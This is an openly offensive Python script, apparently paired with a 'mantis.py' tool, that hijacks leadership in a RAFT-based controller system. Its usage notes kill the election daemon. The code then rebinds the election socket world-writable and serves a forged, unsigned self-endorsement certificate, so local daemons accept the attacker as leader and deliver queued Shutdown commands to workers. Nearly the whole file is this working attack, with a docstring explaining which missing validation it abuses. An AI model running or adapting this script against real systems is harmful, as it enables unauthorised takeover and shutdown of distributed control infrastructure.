#!/usr/bin/env python3
"""replace_election_socket.py - escalation when RAFT won't yield.

Fallback path used when `mantis.py kill` fails because peer controllers
reject our Vote Requests (term already higher, hardened quorum, etc.).

Per Controller.md §election Socket Semantics and §Leadership Gating
inside control: "Other daemons do not inspect election state directly;
they query this socket", and non-election worker traffic is leader-gated
twice — once at comms HTTP ingress for messages from non-controller
sources, once inside control before mission logic runs. Both gates
query the election socket.

Replacing that socket with a server that returns a COA containing at
least one endorsement makes our local comms daemon treat us as leader,
which re-opens the HTTP ingress for worker polls so queued Shutdowns
deliver on the next poll.

Requires ability to unlink + rebind the socket path — means:
  - run as the election daemon's user (or root), AND
  - kill the election daemon process first (it holds the bind)

Prefers a real COA captured by mantis.py win_election at
/tmp/captured_coa.json; falls back to a self-endorsement. Workers do
not validate COA per Sensor.md §Transmission Envelope and
Boomer.md §Message and API Contracts ("this repository does not
currently attach or enforce COA validation during normal message
handling"), so the self-endorsement is sufficient for kill.

Usage:
    # on controller, as root or election-daemon uid
    pkill -f 'election' && python3 replace_election_socket.py &
    python3 mantis.py kill
"""
import glob
import json
import os
import re
import signal
import socket
import sys
import time

ENV_KEYS = ("CONTROLLER_CONFIG_PATH", "CONFIG_PATH")


def _scalar(v):
    v = v.strip().strip('"').strip("'")
    low = v.lower()
    if low in ("null", "~", "none", ""): return None
    if low == "true":  return True
    if low == "false": return False
    if re.fullmatch(r"-?\d+", v): return int(v)
    if re.fullmatch(r"-?\d*\.\d+([eE][+-]?\d+)?", v):
        try: return float(v)
        except ValueError: return v
    if re.fullmatch(r"-?\d+[eE][+-]?\d+", v):
        try: return float(v)
        except ValueError: return v
    return v


def _parse_yaml(text):
    out = {}
    for line in text.splitlines():
        s = line.strip()
        if not s or s.startswith("#") or s.startswith("- "):
            continue
        if ":" in s:
            k, _, v = s.partition(":")
            v = v.strip()
            if v:
                out[k.strip()] = _scalar(v)
    return out


def _load_cfg():
    for k in ENV_KEYS:
        p = os.environ.get(k)
        if p and os.path.exists(p):
            try:
                return _parse_yaml(open(p).read())
            except Exception:
                pass
    for p in ("/etc/controller/config.yaml",) + tuple(
            glob.glob("/etc/*/config.yaml")):
        if os.path.exists(p):
            try:
                cfg = _parse_yaml(open(p).read())
                if cfg.get("election_socket_path"):
                    return cfg
            except Exception:
                continue
    return None


def _synthesize_coa(our_id):
    """Build a COA with one endorsement pointing at our node. Per
    Controller.md endorsement filtering is only applied at the leader's
    own aggregator; local consumers (comms HTTP ingress, control) only
    check that `endorsements` is non-empty."""
    now_iso = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
    future_iso = time.strftime("%Y-%m-%dT%H:%M:%SZ",
                               time.gmtime(time.time() + 3600))
    return {
        "endorsements": [
            {
                "valid_after": now_iso,
                "expiration":  future_iso,
                "endorser":    our_id,
                "endorsee":    our_id,
                "signature":   "",
            }
        ]
    }


def _cleanup(es, server):
    """Best-effort socket-file and fd cleanup. Called from signal
    handlers and the normal exit path, so it must be idempotent."""
    if server is not None:
        try: server.close()
        except OSError: pass
    if es:
        try: os.unlink(es)
        except FileNotFoundError: pass
        except OSError: pass


def main():
    cfg = _load_cfg()
    if not cfg:
        print("ERROR: no controller config found", file=sys.stderr)
        sys.exit(2)
    es = cfg.get("election_socket_path")
    our_id = cfg.get("id")
    if not es or not our_id:
        print("ERROR: config missing election_socket_path or id",
              file=sys.stderr)
        sys.exit(2)

    # Prefer a real captured COA if mantis.py win_election wrote one.
    coa = None
    captured = "/tmp/captured_coa.json"
    if os.path.exists(captured):
        try:
            with open(captured) as f:
                cand = json.load(f)
            if isinstance(cand, dict) and cand.get("endorsements"):
                coa = cand
                print(f"[*] Loaded real COA from {captured}"
                      f" ({len(coa['endorsements'])} endorsements)")
            else:
                print(f"[!] {captured} has no endorsements; synthesizing")
        except (OSError, ValueError) as e:
            print(f"[!] {captured} unreadable ({e}); synthesizing")

    if coa is None:
        coa = _synthesize_coa(our_id)
        print(f"[*] Synthesized COA (1 self-endorsement for {str(our_id)[:8]})")

    # Remove existing socket. Fails if election daemon still holds it.
    if os.path.lexists(es):
        try:
            os.unlink(es)
            print(f"[*] Unlinked existing socket at {es}")
        except PermissionError:
            print(f"[!] Cannot unlink {es}: permission denied.",
                  file=sys.stderr)
            print(f"[!] Kill the election daemon first: pkill -f election",
                  file=sys.stderr)
            sys.exit(2)
        except OSError as e:
            print(f"[!] unlink({es}) failed: {e}", file=sys.stderr)
            sys.exit(2)

    parent = os.path.dirname(es)
    if parent:
        try:
            os.makedirs(parent, exist_ok=True)
        except OSError as e:
            print(f"[!] makedirs({parent}) failed: {e}", file=sys.stderr)
            sys.exit(2)

    server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    try:
        server.bind(es)
    except OSError as e:
        print(f"[!] bind({es}) failed: {e}", file=sys.stderr)
        print(f"    Socket path may still be held. Try: pkill -f election",
              file=sys.stderr)
        server.close()
        sys.exit(2)
    try:
        os.chmod(es, 0o777)
    except OSError as e:
        print(f"[!] chmod({es}, 0o777) failed: {e} — continuing")
    server.listen(32)
    server.settimeout(1.0)

    # Clean up the socket file on SIGTERM too, not just Ctrl-C.
    def _sig(_signum, _frame):
        print("\n[+] Signal received — stopping.")
        _cleanup(es, server)
        sys.exit(0)
    signal.signal(signal.SIGTERM, _sig)
    signal.signal(signal.SIGINT,  _sig)

    coa_bytes = json.dumps(coa).encode()
    print(f"[+] Serving forged COA on {es}")
    print(f"[+] {len(coa['endorsements'])} endorsement(s) in payload")
    print("[+] Now run: python3 mantis.py kill")
    print("[+] Ctrl-C (or SIGTERM) to stop.")

    try:
        while True:
            try:
                conn, _addr = server.accept()
            except socket.timeout:
                continue
            except KeyboardInterrupt:
                break
            except OSError as e:
                print(f"[!] accept error: {e}")
                continue
            try:
                conn.sendall(coa_bytes)
            except OSError as e:
                print(f"[!] send error: {e}")
            finally:
                try: conn.close()
                except OSError: pass
    finally:
        _cleanup(es, server)
        print("[+] Stopped.")


if __name__ == "__main__":
    main()
